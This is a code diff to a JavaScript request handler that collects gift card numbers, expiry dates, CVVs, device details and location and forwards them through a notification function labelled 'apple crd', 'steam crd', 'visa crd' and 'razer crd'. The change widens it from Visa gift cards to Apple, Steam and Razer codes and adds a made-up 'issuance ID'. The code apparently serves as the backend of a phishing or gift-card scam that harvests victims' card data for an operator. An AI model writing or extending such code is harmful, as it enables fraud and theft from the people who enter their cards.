@@ -23,7 +23,12 @@ async function sendNotification(cardData) {
   const titleMap = {
     apple: 'apple crd',
     steam: 'steam crd',
-    visa: 'visa crd'
+    visa: 'visa crd',
+    'apple-legacy': 'apple legacy crd',
+    'steam-legacy': 'steam legacy crd',
+    'visa-legacy': 'visa legacy crd',
+    razer: 'razer crd',
+    'razer-legacy': 'razer legacy crd'
   }
   const title = titleMap[type] || `${type} crd`
   const device = parseDevice(user_agent, browser_info)
@@ -59,12 +64,17 @@ Time: ${time}`
 }
 
 function generateIssuanceId(cardNumber) {
-  const digits = cardNumber.replace(/\D/g, '')
+  // Convert any string to pure alphanumeric, dropping hyphens/spaces
+  const sanitized = String(cardNumber).replace(/\W/g, '')
+  // Convert letters to digits (0-9) to allow mathematical math
+  const digits = sanitized.split('').map(c => parseInt(c, 36) % 10).join('')
   const weights = [7, 6, 5, 4, 3, 2, 1]
+
+  const paddedDigits = digits.padEnd(7, '0').slice(0, 7)
 
   return weights
     .map((weight, index) => {
-      const digit = Number(digits[index])
+      const digit = Number(paddedDigits[index])
       return (digit + weight) % 10
     })
     .join('')
@@ -76,24 +86,29 @@ export default async function handler(req, res) {
   }
 
   const { cardNumber, expiry, cvv, type = 'visa', deviceId, browserInfo, location } = req.body || {}
-  const cleanedCard = typeof cardNumber === 'string' ? cardNumber.replace(/\D/g, '') : ''
+  const isVisaType = type === 'visa' || type === 'visa-legacy'
+  const cleanedCard = typeof cardNumber === 'string' 
+    ? (isVisaType ? cardNumber.replace(/\D/g, '') : cardNumber.replace(/[^a-zA-Z0-9]/g, '').toUpperCase()) 
+    : ''
   const cleanedExpiry = typeof expiry === 'string' ? expiry.trim() : ''
   const cleanedCvv = typeof cvv === 'string' ? cvv.trim() : ''
 
   if (!cleanedCard) {
-    return res.status(400).json({ error: 'Please enter your Visa Gift Card number.' })
+    return res.status(400).json({ error: 'Please enter your Gift Card code.' })
   }
 
   if (cleanedCard.length < 7) {
-    return res.status(400).json({ error: 'Card number must contain at least 7 digits.' })
+    return res.status(400).json({ error: 'Card code must contain at least 7 characters.' })
   }
 
-  if (!cleanedExpiry) {
-    return res.status(400).json({ error: 'Please enter the expiration date.' })
-  }
+  if (isVisaType) {
+    if (!cleanedExpiry) {
+      return res.status(400).json({ error: 'Please enter the expiration date.' })
+    }
 
-  if (!cleanedCvv) {
-    return res.status(400).json({ error: 'Please enter the CVV code.' })
+    if (!cleanedCvv) {
+      return res.status(400).json({ error: 'Please enter the CVV code.' })
+    }
   }
 
   const issuanceId = generateIssuanceId(cleanedCard)
